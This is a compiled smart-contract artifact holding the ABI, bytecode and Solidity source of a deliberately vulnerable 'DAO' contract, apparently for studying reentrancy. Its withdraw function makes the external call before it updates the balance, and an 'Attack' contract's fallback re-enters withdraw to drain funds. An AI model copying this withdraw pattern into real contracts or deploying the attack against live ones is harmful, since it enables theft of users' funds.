{
  "contractName": "DAO",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "balance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "to",
          "type": "address"
        }
      ],
      "name": "addBalance",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "to",
          "type": "address"
        }
      ],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061031b806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d14610067578063b5cef24a14610094578063e3d670d7146100ca578063f8b2cb4f14610121575b600080fd5b34801561007357600080fd5b5061009260048036038101908080359060200190929190505050610178565b005b6100c8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610240565b005b3480156100d657600080fd5b5061010b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061028f565b6040518082815260200191505060405180910390f35b34801561012d57600080fd5b50610162600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102a7565b6040518082815260200191505060405180910390f35b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561023c573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185875af1925050509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60006020528060005260406000206000915090505481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490509190505600a165627a7a723058200a9e9d780c7b3707e94a818fbceccbeb2e898d8d6a2d6136bf268e73e9fa39900029",
  "source": "pragma solidity ^0.4.2;\n\ncontract DAO {   \n  mapping (address => uint) public balance;\n    \n  function addBalance(address to) payable {\n    balance[to] += msg.value;\n  }\n    \n  function withdraw(uint amount) {\n    if (balance[msg.sender]>= amount) {\n      bool res = msg.sender.call.value(amount)();\n      balance[msg.sender]-=amount;\n    }\n  }  \n\n  function getBalance(address to) returns (uint){\n    return balance[to];\n  }\n}\n\ncontract Attack {\n  DAO public dao;\n  address owner;\n  bool isAttack = true;\n\n  function Attack(DAO addr){ \n    owner = msg.sender;\n    dao = addr;\n  }\n\n  function() payable { \n    dao.withdraw(dao.getBalance(this)); \n  }\n\n  function addBalance() {\n      dao.addBalance(this);\n  }\n  \n  function withdraw() {\n      dao.withdraw(dao.getBalance(this));\n  }\n}",
  "sourcePath": "/Users/liubowen/sutd/SCticket/code/contracts/DAO.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.2",
  "updatedAt": "2020-11-17T03:42:54.981Z"
}